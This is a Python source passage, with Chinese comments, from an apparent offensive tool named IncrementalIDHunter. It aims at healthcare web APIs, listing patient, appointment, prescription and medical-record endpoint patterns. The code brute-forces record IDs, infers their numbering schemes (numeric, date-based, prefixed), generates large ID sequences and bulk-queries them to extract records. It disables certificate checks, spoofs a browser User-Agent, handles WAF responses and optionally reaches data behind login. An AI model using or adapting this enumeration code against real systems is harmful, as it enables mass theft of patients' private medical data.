        
        # 按工作日分组
        weekday_stats = defaultdict(list)
        for sample in samples:
            weekday = sample['weekday']
            weekday_stats[weekday].append(sample)
        
        weekday_analysis = {}
        weekday_names = ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday']
        
        for weekday, day_samples in weekday_stats.items():
            success_rate = sum(1 for s in day_samples if s['success']) / len(day_samples)
            avg_response_time = statistics.mean([s['response_time'] for s in day_samples])
            
            weekday_analysis[weekday_names[weekday]] = {
                'sample_count': len(day_samples),
                'success_rate': success_rate,
                'avg_response_time': avg_response_time,
                'activity_score': success_rate * (1.0 / max(avg_response_time, 0.1))
            }
        
        return {
            'hourly_patterns': hourly_analysis,
            'weekday_patterns': weekday_analysis,
            'total_samples': len(samples),
            'overall_success_rate': sum(1 for s in samples if s['success']) / len(samples)
        }
    
    def _detect_work_hour_patterns(self, samples: List[Dict[str, Any]]) -> Dict[str, Any]:
        """检测工作时间模式"""
        if not samples:
            return {'detected': False}
        
        # 定义时间段
        time_periods = {
            'night': list(range(0, 6)),      # 0-5点
            'morning': list(range(6, 12)),   # 6-11点
            'afternoon': list(range(12, 18)), # 12-17点
            'evening': list(range(18, 24))   # 18-23点
        }
        
        period_stats = {}
        for period_name, hours in time_periods.items():
            period_samples = [s for s in samples if s['hour'] in hours]
            
            if period_samples:
                success_rate = sum(1 for s in period_samples if s['success']) / len(period_samples)
                avg_response_time = statistics.mean([s['response_time'] for s in period_samples])
                
                period_stats[period_name] = {
                    'sample_count': len(period_samples),
                    'success_rate': success_rate,
                    'avg_response_time': avg_response_time,
                    'activity_score': success_rate * (1.0 / max(avg_response_time, 0.1))
                }
        
        # 检测是否有明显的工作时间模式
        if len(period_stats) >= 3:
            scores = [stats['activity_score'] for stats in period_stats.values()]
            max_score = max(scores)
            min_score = min(scores)
            
            # 如果最高分和最低分差异很大，说明有明显的时间模式
            pattern_strength = (max_score - min_score) / max(max_score, 0.1)
            
            best_period = max(period_stats.items(), key=lambda x: x[1]['activity_score'])
            worst_period = min(period_stats.items(), key=lambda x: x[1]['activity_score'])
            
            return {
                'detected': pattern_strength > 0.3,  # 30%以上差异认为有模式
                'pattern_strength': pattern_strength,
                'best_period': best_period[0],
                'worst_period': worst_period[0],
                'period_stats': period_stats,
                'recommendation': self._generate_time_recommendation(period_stats)
            }
        
        return {'detected': False, 'period_stats': period_stats}
    
    def _generate_time_recommendation(self, period_stats: Dict[str, Dict[str, Any]]) -> Dict[str, Any]:
        """生成时间建议"""
        # 按活跃度排序
        sorted_periods = sorted(period_stats.items(), key=lambda x: x[1]['activity_score'], reverse=True)
        
        high_activity_periods = [p[0] for p in sorted_periods[:2]]  # 前两个最活跃时段
        low_activity_periods = [p[0] for p in sorted_periods[-2:]]  # 后两个最不活跃时段
        
        # 计算效率提升
        if len(sorted_periods) >= 2:
            best_score = sorted_periods[0][1]['activity_score']
            worst_score = sorted_periods[-1][1]['activity_score']
            efficiency_gain = ((best_score - worst_score) / max(worst_score, 0.1)) * 100
        else:
            efficiency_gain = 0
        
        return {
            'focus_on_periods': high_activity_periods,
            'avoid_periods': low_activity_periods,
            'estimated_efficiency_gain': f"{efficiency_gain:.1f}%",
            'strategy': 'focus_on_active_periods' if efficiency_gain > 30 else 'uniform_distribution'
        }
    
    def _generate_optimization_strategy(self, activity_analysis: Dict[str, Any], work_patterns: Dict[str, Any]) -> Dict[str, Any]:
        """生成优化策略"""
        strategy = {
            'time_based_scanning': False,
            'priority_hours': [],
            'skip_hours': [],
            'weekday_preferences': [],
            'estimated_savings': '0%'
        }
        
        # 如果检测到明显的时间模式
        if work_patterns.get('detected', False):
            strategy['time_based_scanning'] = True
            
            # 优先时间段
            hourly_patterns = activity_analysis.get('hourly_patterns', {})
            if hourly_patterns:
                # 找出活跃度最高的时间段
                sorted_hours = sorted(hourly_patterns.items(), 
                                    key=lambda x: x[1]['activity_score'], reverse=True)
                
                strategy['priority_hours'] = [h[0] for h in sorted_hours[:8]]  # 前8个小时
                strategy['skip_hours'] = [h[0] for h in sorted_hours[-4:]]     # 后4个小时
            
            # 工作日偏好
            weekday_patterns = activity_analysis.get('weekday_patterns', {})
            if weekday_patterns:
                sorted_weekdays = sorted(weekday_patterns.items(),
                                       key=lambda x: x[1]['activity_score'], reverse=True)
                strategy['weekday_preferences'] = [d[0] for d in sorted_weekdays[:5]]  # 前5个工作日
            
            # 估算节省时间
            pattern_strength = work_patterns.get('pattern_strength', 0)
            estimated_savings = int(pattern_strength * 50)  # 最多50%节省
            strategy['estimated_savings'] = f"{estimated_savings}%"
        
        return strategy

    def _assess_field_security_relevance(self, field_name: str, field_type: str) -> str:
        """评估字段安全相关性"""
        field_name_lower = field_name.lower()
        
        if any(keyword in field_name_lower for keyword in ['password', 'token', 'key', 'secret']):
            return 'high'
        elif any(keyword in field_name_lower for keyword in ['id', 'name', 'email', 'phone']):
            return 'medium'
        else:
            return 'low'

class IncrementalIDHunter:
    def __init__(self, target_url, known_endpoints=None, config: IDHunterConfig = None):
        self.target_url = target_url.rstrip('/')
        self.known_endpoints = known_endpoints or []
        self.config = config or IDHunterConfig()
        
        # 核心数据结构
        self.discovered_ids = defaultdict(list)
        self.id_patterns = {}
        self.extracted_data = []
        
        # WAF Defender 相关
        self.waf_defender = None
        self.waf_defender_initialized = False
        
        # 性能监控
        self.metrics = PerformanceMetrics()
        
        # 缓存系统
        self.endpoint_cache = {}
        self.id_validation_cache = {}
        
        # 智能限流器
        self.smart_limit_manager = None
        if SMART_LIMITS_AVAILABLE and self.config.enable_smart_limits:
            try:
                system_size = getattr(SystemSize, self.config.system_size.upper(), SystemSize.MEDIUM)
                self.smart_limit_manager = SmartLimitManager(system_size)
            except Exception as e:
                logger.warning(f"智能限流器初始化失败: {e}")
        
        # 核心优化组件
        self.adaptive_concurrency = AdaptiveConcurrencyController(
            initial_concurrency=self.config.max_concurrent_requests,
            max_concurrency=self.config.max_concurrent_requests * 2
        )
        self.priority_queue = PriorityTaskQueue(max_size=self.config.max_discovered_ids)
        self.advanced_id_recognizer = AdvancedIDRecognizer()
        self.form_extractor = IntelligentFormExtractor()
        self.id_correlator = IDCorrelationEngine()
        self.time_window_optimizer = TimeWindowOptimizer()
        
        # 认证管理器
        self.auth_manager = None
        if AUTH_MANAGER_AVAILABLE and self.config.enable_authentication and self.config.auth_config:
            try:
                auth_config = AuthConfig(**self.config.auth_config)
                self.auth_manager = AuthenticationManager(auth_config)
                logger.info("[+] 认证管理器初始化成功 - 可访问认证后数据")
            except Exception as e:
                logger.warning(f"认证管理器初始化失败: {e}")
        
        # 请求控制 (替换原始的semaphore)
        self.session = None
        self.semaphore = asyncio.Semaphore(self.config.max_concurrent_requests)
        
        # 噪音过滤统计
        self.noise_stats = {
            'total_checked': 0,
            'filtered_out': 0,
            'valuable_findings': 0,
            'third_party_filtered': 0
        }
        
        # WAF统计
        self.waf_stats = {
            'total_validations': 0,
            'waf_detected': 0,
            'real_responses': 0,
            'validation_errors': 0
        }
        
        # 医疗系统常见的ID端点
        self.id_endpoints = [
            # 患者相关
            '/api/patient/{id}', '/api/patients/{id}', '/patient/{id}',
            '/api/v1/patient/{id}', '/api/v2/patient/{id}',
            '/api/patient/detail/{id}', '/api/patient/info/{id}',
            '/api/kanja/{id}', '/api/患者/{id}',
            
            # 预约相关
            '/api/appointment/{id}', '/api/appointments/{id}',
            '/appointment/{id}', '/booking/{id}',
            '/api/yoyaku/{id}', '/api/予約/{id}',
            
            # 处方相关
            '/api/prescription/{id}', '/api/prescriptions/{id}',
            '/prescription/{id}', '/rx/{id}',
            '/api/medicine/{id}', '/api/drug/{id}',
            
            # 医疗记录
            '/api/record/{id}', '/api/records/{id}',
            '/api/medical-record/{id}', '/medical/{id}',
            '/api/chart/{id}', '/api/カルテ/{id}',
            
            # 用户相关
            '/api/user/{id}', '/api/users/{id}', '/user/{id}',
            '/api/member/{id}', '/api/account/{id}',
            '/profile/{id}', '/api/profile/{id}',
            
            # 通用数据
            '/api/data/{id}', '/api/get/{id}', '/api/view/{id}',
            '/api/detail/{id}', '/api/info/{id}',
            '/download/{id}', '/export/{id}', '/file/{id}'
        ]
        
        # ID格式分析器
        self.id_analyzers = {
            'numeric': self.analyze_numeric_id,
            'date_based': self.analyze_date_based_id,
            'uuid': self.analyze_uuid_id,
            'composite': self.analyze_composite_id,
            'custom': self.analyze_custom_id
        }
        
        # 医疗系统ID前缀
        self.medical_prefixes = [
            'P', 'PT', 'PAT',      # Patient
            'A', 'AP', 'APT',      # Appointment
            'RX', 'PR', 'MED',     # Prescription
            'MR', 'REC', 'CHT',    # Medical Record
            'U', 'USR', 'MEM',     # User
            'D', 'DR', 'DOC',      # Doctor
            # 日文前缀
            'K', 'KJ',             # 患者(Kanja)
            'Y', 'YY',             # 予約(Yoyaku)
        ]

    async def _initialize_waf_defender(self):
        """初始化 WAF Defender"""
        if not WAF_DEFENDER_AVAILABLE or self.waf_defender_initialized or not self.config.enable_waf_protection:
            return
        
        try:
            logger.info("[*] 初始化 WAF Defender...")
            # 创建临时session来初始化WAF Defender
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            conn = aiohttp.TCPConnector(ssl=ssl_context)
            
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=30)) as session:
                self.waf_defender = await create_waf_defender(self.target_url, session)
                self.waf_defender_initialized = True
                logger.info("[+] WAF Defender 初始化成功")
        except Exception as e:
            logger.warning(f"[!] WAF Defender 初始化失败: {e}")
            self.waf_defender_initialized = False

    async def _validate_response_with_waf(self, url: str, response: aiohttp.ClientResponse, content: str = None) -> bool:
        """使用WAF Defender验证响应"""
        if not self.waf_defender or not self.config.enable_waf_protection:
            return True
        
        # 采样验证以提高性能
        if self.config.waf_validation_sample_rate < 1.0:
            import random
            if random.random() > self.config.waf_validation_sample_rate:
                return True
        
        try:
            self.waf_stats['total_validations'] += 1
            is_real = await self.waf_defender.simple_validate(url, response)
            
            if not is_real:
                self.waf_stats['waf_detected'] += 1
                self.metrics.record_waf_block()
                logger.debug(f"      WAF欺骗检测: 跳过伪造响应 {url}")
                return False
            
            self.waf_stats['real_responses'] += 1
            return True
        except Exception as e:
            self.waf_stats['validation_errors'] += 1
            logger.debug(f"    WAF验证异常: {e}")
            return True  # 验证异常时保守处理

    def _filter_endpoint_noise(self, endpoint: str, url: str) -> bool:
        """过滤端点噪音"""
        if not NOISE_FILTER_AVAILABLE or not self.config.enable_noise_filtering:
            return True
        
        self.noise_stats['total_checked'] += 1
        
        # 检查URL是否为第三方服务
        if is_third_party(url):
            self.noise_stats['third_party_filtered'] += 1
            self.noise_stats['filtered_out'] += 1
            self.metrics.record_noise_filter()
            return False
        
        # 使用智能过滤器
        if not smart_filter(url, 'api_endpoint'):
            self.noise_stats['filtered_out'] += 1
            self.metrics.record_noise_filter()
            return False
        
        self.noise_stats['valuable_findings'] += 1
        return True

    def _filter_data_noise(self, data: Dict) -> bool:
        """过滤提取数据中的噪音"""
        if not NOISE_FILTER_AVAILABLE or not self.config.enable_noise_filtering:
            return True
        
        # 检查数据是否有安全价值
        if not has_security_value(data):
            self.metrics.record_noise_filter()
            return False
        
        return True

    async def _create_session(self):
        """创建优化的HTTP会话"""
        if self.session and not self.session.closed:
            return self.session
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        # 连接池优化
        connector = aiohttp.TCPConnector(
            ssl=ssl_context,
            limit=self.config.max_concurrent_requests * 2,
            limit_per_host=self.config.max_concurrent_requests,
            ttl_dns_cache=300,
            use_dns_cache=True,
            enable_cleanup_closed=True
        )
        
        timeout = aiohttp.ClientTimeout(
            total=self.config.request_timeout,
            connect=5,
            sock_read=5
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        return self.session

    async def _safe_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[aiohttp.ClientResponse]:
        """安全的HTTP请求 - 支持认证管理器"""
        if not self.session:
            await self._create_session()
        
        # 如果启用了认证管理器，为请求添加认证信息
        if self.auth_manager:
            try:
                kwargs = await self.auth_manager.prepare_request(url, **kwargs)
            except Exception as e:
                logger.debug(f"认证准备失败: {e}")
        
        async with self.semaphore:
            start_time = time.time()
            
            for attempt in range(self.config.max_retries):
                try:
                    # 智能限流
                    if self.smart_limit_manager:
                        await self.smart_limit_manager.wait_if_needed()
                    
                    # 发起请求
                    response = await self.session.request(method, url, **kwargs)
                    
                    # 检查认证状态
                    if self.auth_manager:
                        auth_ok = await self.auth_manager.handle_response(response, url)
                        if not auth_ok and self.auth_manager.should_retry(response):
                            # 认证失效，尝试恢复
                            logger.info("[!] 检测到认证失效，尝试恢复...")
                            await response.release()  # 释放连接
                            
                            recovery_success = await self.auth_manager._recover_authentication()
                            if recovery_success:
                                # 重新准备请求
                                kwargs = await self.auth_manager.prepare_request(url, **kwargs)
                                # 重试请求
                                response = await self.session.request(method, url, **kwargs)
                    
                    response_time = time.time() - start_time
                    self.metrics.record_request(True, response_time)
                    return response
                        
                except asyncio.TimeoutError:
                    self.metrics.record_request(False, error_type='timeout')
                    if attempt < self.config.max_retries - 1:
                        await asyncio.sleep(self.config.retry_delay * (attempt + 1))
                        continue
                    break
                except aiohttp.ClientError as e:
                    self.metrics.record_request(False, error_type='client_error')
                    if attempt < self.config.max_retries - 1:
                        await asyncio.sleep(self.config.retry_delay * (attempt + 1))
                        continue
                    break
                except Exception as e:
                    self.metrics.record_request(False, error_type='unknown')
                    logger.debug(f"请求异常: {type(e).__name__}: {str(e)}")
                    break
            
            return None

    async def _cleanup_session(self):
        """清理会话"""
        if self.session and not self.session.closed:
            await self.session.close()
            self.session = None

    async def run(self):
        """主执行函数"""
        logger.info(f"[*] 开始增量ID智能分析: {self.target_url}")
        logger.info(f"[*] 时间: {datetime.now()}")
        
        try:
            # 0. 初始化
            await self._initialize_waf_defender()
            await self._create_session()
            
            # 初始化认证管理器
            if self.auth_manager:
                await self.auth_manager.initialize()
                logger.info("[+] 认证管理器初始化完成")
            
            # 显示配置信息
            self._print_configuration()
            
            # 1. 发现ID端点
            await self.discover_id_endpoints()
            
            # 2. 收集样本ID
            await self.collect_sample_ids()
            
            # 3. 分析ID模式
            self.analyze_id_patterns()
            
            # 4. 生成ID序列
            generated_ids = self.generate_id_sequences()
            
            # 5. 批量查询数据
            await self.bulk_query_ids(generated_ids)
            
            # 6. 生成报告
            self.generate_report()
            
            return self.extracted_data
            
        except Exception as e:
            logger.error(f"[!] 运行异常: {e}")
            raise
        finally:
            await self._cleanup_session()

    def _print_configuration(self):
        """打印配置信息"""
        logger.info("\n[*] 配置信息:")
        logger.info(f"    WAF保护: {'启用' if self.config.enable_waf_protection and WAF_DEFENDER_AVAILABLE else '禁用'}")
        logger.info(f"    噪音过滤: {'启用' if self.config.enable_noise_filtering and NOISE_FILTER_AVAILABLE else '禁用'}")
        logger.info(f"    智能限流: {'启用' if self.config.enable_smart_limits and SMART_LIMITS_AVAILABLE else '禁用'}")
        logger.info(f"    认证管理: {'启用' if self.auth_manager else '禁用'}")
        if self.auth_manager:
            auth_stats = self.auth_manager.get_auth_stats()
            auth_type = auth_stats.get('current_auth_type', 'unknown')
            logger.info(f"    认证类型: {auth_type}")
        logger.info(f"    并发请求数: {self.config.max_concurrent_requests}")
        logger.info(f"    请求超时: {self.config.request_timeout}秒")
        logger.info(f"    最大重试: {self.config.max_retries}次")

    async def discover_id_endpoints(self):
        """发现使用ID的端点"""
        logger.info("[+] 发现ID端点...")
        
        # 添加已知端点
        if self.known_endpoints:
            self.id_endpoints.extend(self.known_endpoints)
        
        # 测试常见ID值
        test_ids = ['1', '123', '1000', '2024010001', 'test']
        valid_endpoints = []
        
        # 限制测试数量以提高性能
        test_endpoints = self.id_endpoints[:10]  # 只测试前10个端点
        
        for endpoint_pattern in test_endpoints:
            for test_id in test_ids:
                url = urljoin(self.target_url, endpoint_pattern.replace('{id}', str(test_id)))
                
                # 噪音过滤
                if not self._filter_endpoint_noise(endpoint_pattern, url):
                    continue
                
                response = await self._safe_request(url)
                if not response:
                    continue
                
                try:
                    # WAF验证
                    if not await self._validate_response_with_waf(url, response):
                        continue
                    
                    if response.status in [200, 403, 401]:  # 存在但可能需要权限
                        valid_endpoints.append({
                            'pattern': endpoint_pattern,
                            'test_id': test_id,
                            'status': response.status,
                            'url': url
                        })
                        
                        logger.info(f"[!] 发现有效端点: {endpoint_pattern} (状态: {response.status})")
                        
                        # 如果是200，尝试提取ID格式
                        if response.status == 200:
                            try:
                                content_type = response.headers.get('content-type', '').lower()
                                if 'application/json' in content_type:
                                    data = await response.json()
                                    if isinstance(data, dict):
                                        # 查找ID字段
                                        for key in ['id', '_id', 'ID', 'patient_id', 'user_id', 'record_id']:
                                            if key in data:
                                                actual_id = data[key]
                                                self.discovered_ids[endpoint_pattern].append(actual_id)
                                                logger.info(f"    实际ID: {actual_id}")
                                                break
                            except Exception as e:
                                logger.debug(f"JSON解析异常: {e}")
                        break  # 找到一个有效的就跳过
                        
                except Exception as e:
                    logger.debug(f"端点测试异常: {e}")
                finally:
                    # 确保响应被正确关闭
                    if hasattr(response, 'close'):
                        response.close()
        
        self.id_endpoints = [ep['pattern'] for ep in valid_endpoints]
        logger.info(f"[+] 发现 {len(self.id_endpoints)} 个有效端点")

    async def collect_sample_ids(self):
        """收集样本ID"""
        logger.info("[+] 收集样本ID...")
        
        # 1. 尝试列表端点获取ID
        list_endpoints = [
            '/api/patients', '/api/users', '/api/appointments',
            '/api/list', '/api/all', '/api/search'
        ]
        
        for endpoint in list_endpoints:
            url = urljoin(self.target_url, endpoint)
            
            # 噪音过滤
            if not self._filter_endpoint_noise(endpoint, url):
                continue
            
            response = await self._safe_request(url, timeout=aiohttp.ClientTimeout(total=10))
            if not response:
                continue
            
            try:
                # WAF验证
                if not await self._validate_response_with_waf(url, response):
                    continue
                
                if response.status == 200:
                    content_type = response.headers.get('content-type', '').lower()
                    if 'application/json' in content_type:
                        data = await response.json()
                        
                        # 过滤数据噪音
                        if not self._filter_data_noise(data if isinstance(data, dict) else {'data': data}):
                            continue
                        
                        ids_count = 0
                        
                        # 提取ID
                        if isinstance(data, list):
                            for item in data[:50]:  # 限制数量
                                if isinstance(item, dict):
                                    for key in ['id', '_id', 'ID']:
                                        if key in item:
                                            self.discovered_ids['list'].append(item[key])
                                            ids_count += 1
                                            
                        elif isinstance(data, dict) and 'data' in data:
                            # 分页格式
                            for item in data['data'][:50]:
                                if isinstance(item, dict):
                                    for key in ['id', '_id', 'ID']:
                                        if key in item:
                                            self.discovered_ids['list'].append(item[key])
                                            ids_count += 1
                                            
                        if ids_count > 0:
                            logger.info(f"[+] 从 {endpoint} 收集到 {ids_count} 个ID")
                        
            except Exception as e:
                logger.debug(f"列表端点异常: {e}")
            finally:
                if hasattr(response, 'close'):
                    response.close()
        
        # 2. 暴力枚举一些ID
        logger.info("[+] 暴力枚举ID样本...")
        
        # 测试不同的ID格式
        test_ranges = {
            'numeric': range(1, 100, 10),  # 1, 11, 21...
            'date_2024': [f'202401{i:04d}' for i in range(1, 10)],  # 202401001
            'date_2023': [f'202312{i:04d}' for i in range(1, 10)],  # 202312001
            'prefix_P': [f'P{i:04d}' for i in range(1, 10)],        # P0001
            'prefix_PAT': [f'PAT{i:06d}' for i in range(1, 10)],    # PAT000001
        }
        
        # 测试前3个端点
        test_endpoints = self.id_endpoints[:3] if len(self.id_endpoints) >= 3 else self.id_endpoints
        
        for endpoint_pattern in test_endpoints:
            for format_name, id_list in test_ranges.items():
                success_count = 0
                
                for test_id in id_list:
                    url = urljoin(self.target_url, endpoint_pattern.replace('{id}', str(test_id)))
                    
                    # 噪音过滤
                    if not self._filter_endpoint_noise(endpoint_pattern, url):
                        continue
                    
                    response = await self._safe_request(url, timeout=aiohttp.ClientTimeout(total=3))
                    if not response:
                        continue
                    
                    try:
                        # WAF验证
                        if not await self._validate_response_with_waf(url, response):
                            continue
                        
                        if response.status == 200:
                            success_count += 1
                            self.discovered_ids[endpoint_pattern].append(test_id)
                            
                            if success_count >= 3:  # 连续成功3个
                                logger.info(f"[!] 发现ID格式: {format_name} at {endpoint_pattern}")
                                break
                                
                    except Exception as e:
                        logger.debug(f"暴力枚举异常: {e}")
                    finally:
                        if hasattr(response, 'close'):
                            response.close()
                            
    def analyze_id_patterns(self):
        """分析ID模式"""
        logger.info("\n[+] 分析ID模式...")
        
        all_ids = []
        for endpoint, ids in self.discovered_ids.items():
            all_ids.extend(ids)
            
        if not all_ids:
            logger.warning("[-] 未收集到有效ID")
            return
            
        logger.info(f"[+] 分析 {len(all_ids)} 个ID样本")
        
        # 去重并限制数量以提高性能
        unique_ids = list(set(all_ids))[:self.config.max_discovered_ids]
        
        # 分析每种ID格式
        # 使用高级ID识别器
        comprehensive_analysis = self.advanced_id_recognizer.analyze_id_comprehensive(unique_ids)
        
        if comprehensive_analysis:
            self.id_patterns.update(comprehensive_analysis)
            logger.info(f"[!] 高级识别器检测到 {len(comprehensive_analysis)} 种模式")
            
            for pattern_type, pattern_info in comprehensive_analysis.items():
                if isinstance(pattern_info, dict):
                    sample = pattern_info.get('sample', pattern_info.get('sample_ids', []))
                    if sample:
                        logger.info(f"    {pattern_type}: {sample[:3]}...")
        
        # 传统分析器作为备用
        for id_type, analyzer in self.id_analyzers.items():
            try:
                if id_type not in self.id_patterns:  # 避免重复
                    pattern = analyzer(unique_ids)
                    if pattern:
                        self.id_patterns[id_type] = pattern
                        logger.info(f"[!] 传统分析器检测到{id_type}模式: {pattern}")
            except Exception as e:
                logger.debug(f"ID模式分析异常 ({id_type}): {e}")
        
        # 内存清理
        if len(unique_ids) > 1000:
            gc.collect()

    def analyze_numeric_id(self, ids):
        """分析纯数字ID"""
        numeric_ids = []
        
        for id_val in ids:
            try:
                if isinstance(id_val, int) or (isinstance(id_val, str) and id_val.isdigit()):
                    numeric_ids.append(int(id_val))
            except (ValueError, TypeError):
                continue
        if not numeric_ids:
            return None
            
        numeric_ids.sort()
        
        # 分析规律
        if len(numeric_ids) >= 2:
            # 计算差值
            diffs = [numeric_ids[i+1] - numeric_ids[i] for i in range(len(numeric_ids)-1)]
            
            # 检查是否是等差数列
            if diffs and all(d == diffs[0] for d in diffs):
                return {
                    'type': 'arithmetic',
                    'start': min(numeric_ids),
                    'end': max(numeric_ids) + 1000,  # 扩展范围
                    'step': diffs[0],
                    'sample': numeric_ids[:5]
                }
            else:
                # 可能是随机但在某个范围内
                return {
                    'type': 'range',
                    'min': min(numeric_ids),
                    'max': max(numeric_ids) + 1000,
                    'sample': numeric_ids[:5]
                }
                
        return None

    def analyze_date_based_id(self, ids):
        """分析基于日期的ID"""
        date_patterns = []
        
        for id_val in ids:
            id_str = str(id_val)
            
            # YYYYMMDD + 序号
            match = re.match(r'^(\d{8})(\d+)$', id_str)
            if match:
                date_part = match.group(1)
                seq_part = match.group(2)
                
                try:
                    # 验证日期有效性
                    datetime.strptime(date_part, '%Y%m%d')
                    date_patterns.append({
                        'date': date_part,
                        'sequence': int(seq_part),
                        'seq_length': len(seq_part),
                        'full_id': id_str
                    })
                except (ValueError, TypeError):
                    continue
        if date_patterns:
            # 分析序号长度
            seq_lengths = [p['seq_length'] for p in date_patterns]
            most_common_length = max(set(seq_lengths), key=seq_lengths.count)
            
            # 找出日期范围
            dates = [p['date'] for p in date_patterns]
            min_date = min(dates)
            max_date = max(dates)
            
            return {
                'type': 'date_sequence',
                'date_format': 'YYYYMMDD',
                'sequence_length': most_common_length,
                'date_range': (min_date, max_date),
                'sample': [p['full_id'] for p in date_patterns[:5]]
            }
            
        return None

    def analyze_uuid_id(self, ids):
        """分析UUID格式ID"""
        uuid_pattern = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
        
        uuid_ids = [id_val for id_val in ids if isinstance(id_val, str) and uuid_pattern.match(id_val)]
        
        if len(uuid_ids) >= 3:
            return {
                'type': 'uuid',
                'version': 4,  # 假设是UUID v4
                'sample': uuid_ids[:5]
            }
            
        return None

    def analyze_composite_id(self, ids):
        """分析复合ID（前缀+数字）"""
        composite_patterns = defaultdict(list)
        
        for id_val in ids:
            id_str = str(id_val)
            
            # 匹配前缀+数字
            match = re.match(r'^([A-Z]+)(\d+)$', id_str, re.I)
            if match:
                prefix = match.group(1).upper()
                number = int(match.group(2))
                
                composite_patterns[prefix].append({
                    'number': number,
                    'length': len(match.group(2)),
                    'full_id': id_str
                })
                
        if composite_patterns:
            # 分析每个前缀
            results = {}
            
            for prefix, patterns in composite_patterns.items():
                if len(patterns) >= 2:
                    numbers = [p['number'] for p in patterns]
                    lengths = [p['length'] for p in patterns]
                    
                    # 最常见的长度
                    common_length = max(set(lengths), key=lengths.count)
                    
                    results[prefix] = {
                        'prefix': prefix,
                        'number_length': common_length,
                        'min_number': min(numbers),
                        'max_number': max(numbers),
                        'sample': [p['full_id'] for p in patterns[:3]]
                    }
                    
            if results:
                return {
                    'type': 'composite',
                    'patterns': results
                }
                
        return None

    def analyze_custom_id(self, ids):
        """分析自定义格式ID"""
        # 这里可以添加更多自定义分析逻辑
        return None

    def generate_id_sequences(self):
        """生成ID序列"""
        print("\n[+] 生成ID序列...")
        
        generated_ids = defaultdict(list)
        
        for pattern_type, pattern_info in self.id_patterns.items():
            if pattern_type == 'numeric' and pattern_info['type'] == 'arithmetic':
                # 等差数列
                start = pattern_info['start']
                end = min(pattern_info['end'], start + 1000)  # 限制数量
                step = pattern_info['step']
                
                ids = list(range(start, end, step))
                generated_ids['numeric'].extend(ids)
                print(f"[+] 生成数字序列: {len(ids)} 个")
                
            elif pattern_type == 'numeric' and pattern_info['type'] == 'range':
                # 范围内的数字
                min_id = pattern_info['min']
                max_id = min(pattern_info['max'], min_id + 500)  # 限制数量
                
                ids = list(range(min_id, max_id + 1))
                generated_ids['numeric'].extend(ids)
                print(f"[+] 生成数字范围: {len(ids)} 个")
                
            elif pattern_type == 'date_based':
                # 基于日期的ID
                date_format = pattern_info['date_format']
                seq_length = pattern_info['sequence_length']
                
                # 生成最近30天的ID
                today = datetime.now()
                ids = []
                
                for days_ago in range(30):
                    date = today - timedelta(days=days_ago)
                    date_str = date.strftime('%Y%m%d')
                    
                    # 每天生成100个序号
                    for seq in range(1, 101):
                        id_val = f"{date_str}{seq:0{seq_length}d}"
                        ids.append(id_val)
                        
                generated_ids['date_based'].extend(ids)
                print(f"[+] 生成日期序列: {len(ids)} 个")
                
            elif pattern_type == 'composite':
                # 复合ID
                for prefix, info in pattern_info['patterns'].items():
                    prefix_str = info['prefix']
                    num_length = info['number_length']
                    min_num = info['min_number']
                    max_num = min(info['max_number'] + 100, min_num + 500)
                    
                    ids = []
                    for num in range(min_num, max_num + 1):
                        id_val = f"{prefix_str}{num:0{num_length}d}"
                        ids.append(id_val)
                        
                    generated_ids[f'composite_{prefix}'].extend(ids)
                    print(f"[+] 生成{prefix}序列: {len(ids)} 个")
                    
        return generated_ids

    async def bulk_query_ids(self, generated_ids):
        """批量查询ID - 使用优先级队列和自适应并发"""
        logger.info("\n[+] 智能批量查询数据...")
        
        # 1. 时间窗口优化
        time_optimization = await self.time_window_optimizer.detect_optimal_time_windows(
            self.id_endpoints[:3], self.session
        )
        
        # 应用时间窗口优化到任务调度
        self.time_strategy = time_optimization.get('optimization_strategy', {})
        
        if self.time_strategy.get('time_based_scanning'):
            logger.info("[+] 检测到时间模式，启用时间窗口优化")
            logger.info(f"    预计效率提升: {self.time_strategy['estimated_savings']}")
            logger.info(f"    优先时间段: {self.time_strategy.get('priority_hours', [])}")
            logger.info(f"    避免时间段: {self.time_strategy.get('skip_hours', [])}")
        else:
            self.time_strategy = {}
        
        # 2. ID关联推断
        logger.info("[+] 执行ID关联推断...")
        correlated_ids = self.id_correlator.infer_correlated_ids(self.discovered_ids, self.id_patterns)
        
        if correlated_ids:
            logger.info(f"[!] 推断出 {len(correlated_ids)} 类关联ID")
            # 合并到generated_ids中
            for corr_type, corr_list in correlated_ids.items():
                if corr_list:
                    generated_ids[f'correlated_{corr_type}'] = corr_list[:100]  # 限制数量
        
        # 3. 构建优先级任务队列
        total_tasks_created = 0
        
        for id_type, id_list in generated_ids.items():
            logger.info(f"\n[+] 处理{id_type}类型ID ({len(id_list)}个)...")
            
            # 限制查询数量以提高性能
            sample_ids = id_list[:min(200, self.config.max_extracted_data // len(generated_ids))]
            
            # 为每个ID-端点组合创建任务
            for endpoint_pattern in self.id_endpoints[:3]:  # 限制端点数量
                for id_val in sample_ids:
                    url = urljoin(self.target_url, endpoint_pattern.replace('{id}', str(id_val)))
                    
                    # 噪音过滤
                    if not self._filter_endpoint_noise(endpoint_pattern, url):
                        continue
                    
                    # 计算任务优先级
                    priority = self._calculate_task_priority(id_type, endpoint_pattern, id_val)
                    
                    # 创建任务
                    task = IDTask(
                        priority=priority,
                        id_value=str(id_val),
                        endpoint_pattern=endpoint_pattern,
                        task_type='data_extraction',
                        metadata={
                            'id_type': id_type,
                            'url': url,
                            'correlation_strength': self._get_correlation_strength(id_type)
                        }
                    )
                    
                    # 添加到优先级队列
                    await self.priority_queue.put(task)
                    total_tasks_created += 1
        
        logger.info(f"[+] 创建了 {total_tasks_created} 个优先级任务")
        
        # 4. 执行优先级任务队列
        await self._execute_priority_task_queue()
        
        # 5. 学习成功的关联
        self._learn_successful_correlations()

